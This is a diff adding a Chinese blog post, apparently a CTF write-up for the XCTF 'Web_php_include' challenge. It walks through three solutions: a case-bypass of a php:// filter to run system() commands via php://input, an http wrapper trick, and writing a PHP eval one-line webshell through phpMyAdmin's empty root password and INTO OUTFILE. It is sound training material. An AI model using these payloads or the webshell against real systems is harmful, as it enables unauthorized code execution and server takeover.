@@ -152,6 +152,98 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-Web-002" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/11/15/Web-002/">Web_002</a>
+    </h1>
+  
+
+        
+        <a href="/2020/11/15/Web-002/" class="archive-article-date">
+  	<time datetime="2020-11-15T08:27:58.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-15</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Web-php-include-考察文件包含"><a href="#Web-php-include-考察文件包含" class="headerlink" title="Web_php_include(考察文件包含)"></a>Web_php_include(考察文件包含)</h2><p>strstr函数：strstr(字符串,你要搜索的内容,false)<br>#字符串：也就是代码中的<code>$page</code>。例如：在url后面添加 /?page=123456，那么<code>$page</code>的内容就是123456。</p>
+<p>#你要搜索的内容：也就是题目中的php://。意思就是该函数会从$page的内容里去寻找php://，而这里是一个while语句，一旦查找到php://，那么就会执行大括号里面的语句。</p>
+<p>#false：该参数默认是false，也就是一般情况只需要写前两个参数即可。false代表匹配到php://之后，会输出php://和之后的内容。而如果为true，则会输出“php.”，也就是php://前面的内容。    例如URL为<br><a target="_blank" rel="noopener" href="http://111.198.29.45:50769/?page=php.php://input">http://111.198.29.45:50769/?page=php.php://input</a><br>那么传入的$page的内容就是php://input，而前面的“php.”就会被丢弃。</p>
+<p>#注：strstr函数对大小写敏感，也就是会区分大小写。</p>
+<p>str_replace()以其他字符替换字符串中的一些字符(区分大小写)：<br>例如：str_replace(“1”，“2”，“123”)会输出223。因为会将全部的1替换为2。</p>
+<p><img src="https://img-blog.csdnimg.cn/20201030190525283.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>打开页面是这样一段代码，从代码中得知page中带有php://的都会被替换成空,程序过滤掉了page=参数传入php://<br>strstr() 查找字符串首次出现的位置。返回字符串剩余部分</p>
+<p>解法一（大小写绕过）：<br>（1）由于strstr()这个函数是区分大小写的，所以可以用PHP://来代替。即<a target="_blank" rel="noopener" href="http://220.249.52.133:45015/?page=PHP://input">http://220.249.52.133:45015/?page=PHP://input</a><br><img src="https://img-blog.csdnimg.cn/20201030190758224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）首先使用手动代理配置，打开burp工具，配置拦截请求，刷新网页后，进行burp抓包<br><img src="https://img-blog.csdnimg.cn/20201030190840259.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030190850501.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）post传参<?php system("ls");?>，在burp中点击废包查看<br><img src="https://img-blog.csdnimg.cn/20201030190925996.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030190938284.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（4）发送到Repeater，在重发器中点击发送，可看到fl4gisisish3r3.php<br><img src="https://img-blog.csdnimg.cn/20201030191123792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20201030191014504.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（5）继续post传参<?php system("cat fl4gisisish3r3.php");?>，即可看到flag<br><img src="https://img-blog.csdnimg.cn/20201030191041787.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030191102198.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>解法二：<br>（1）while函数根据page参数来判断php文件是否存在，如果存在此文件，则进行文件包含。代码中的hello是有回显的，可以命令执行然后回显到浏览器<br><img src="https://img-blog.csdnimg.cn/20201030191238482.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）构造payload，默认页面为<a target="_blank" rel="noopener" href="http://127.0.0.1/index.php,%E8%AE%BE%E7%BD%AE%E4%B8%BApage%E5%80%BC%EF%BC%8C%E5%8F%AF%E7%A1%AE%E4%BF%9Dwhile%E4%B8%BA%E7%9C%9F%EF%BC%8C%E8%AE%A9page%E5%8F%82%E6%95%B0%E7%94%A8http%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AE%BF%E9%97%AE127.0.0.1%E8%BF%99%E4%B8%AA%E6%9D%A1%E4%BB%B6%E8%82%AF%E5%AE%9A%E4%B8%BA%E7%9C%9F%E3%80%82">http://127.0.0.1/index.php,设置为page值，可确保while为真，让page参数用http伪协议访问127.0.0.1这个条件肯定为真。</a><br><img src="https://img-blog.csdnimg.cn/20201030191315511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）看到了三个文件，继续构造payload，查看fl4gisisish3r3.php，发现flag<br><img src="https://img-blog.csdnimg.cn/20201030191342427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>解法三：<br>（1）用御剑扫描后台，会扫到phpmyadmin后台<br><img src="https://img-blog.csdnimg.cn/20201030191434792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）双击它进入登录界面，用户名输入为root，密码为空。（弱口令）进入<br><img src="https://img-blog.csdnimg.cn/20201030191457439.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）进入SQL语句输入的地方，执行命令show variables like “secure_file_priv”查看secure_file_priv是否为空，为空则可以写数据，如果是null则不能写。<br><img src="https://img-blog.csdnimg.cn/20201030191525711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（4）进入SQL语句输入的地方，编辑一句话木马并执行select”<?php eval($_POST(shell);?> “ into outfile ‘/tmp/songrong.php’<br>其中shell为口令，可任意修改，songrong也可修改。Linux默认tmp是可写目录，所以在tmp目录下写入<br><img src="https://img-blog.csdnimg.cn/2020103019155011.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（5）然后打开菜刀类工具中国蚁剑，输入URL和密码连接<br><img src="https://img-blog.csdnimg.cn/20201030191609307.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（6）连接成功后，打开文件管理，可发现flag<br><img src="https://img-blog.csdnimg.cn/20201030191713431.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030191720118.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">CTF靶场</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/XCTF-Web进阶区//" class="article-tag-list-link color2">XCTF_Web进阶区</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/11/15/Web-002/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-Web-001" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
